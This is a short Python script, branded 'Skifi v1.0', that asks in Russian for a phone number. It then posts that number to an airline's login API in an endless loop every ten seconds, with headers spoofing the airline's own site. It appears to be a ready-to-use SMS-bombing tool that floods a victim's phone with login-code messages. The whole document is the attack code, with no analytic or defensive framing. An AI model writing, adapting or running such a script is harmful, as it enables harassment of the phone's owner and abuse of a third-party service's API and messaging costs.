import requests
import time
import os
try:
	os.system("clear")
except:
	pass
print("""
	By
	  Skifi v1.0
	""")
phone = input("Телефон в формате 79xxxxxxx (пример):")

while True:	
	r = requests.post('https://b.utair.ru/api/v1/login/',
    data = {'login':phone},
    headers = {
    'Accept-Language':'en-US,en;q=0.5',
    'Connection':'keep-alive',
    'Host':'b.utair.ru',
    'origin':'https://www.utair.ru',
    'Referer':'https://www.utair.ru/'})
    
	time.sleep(10)
	 	
	print(r)
	print(r.text)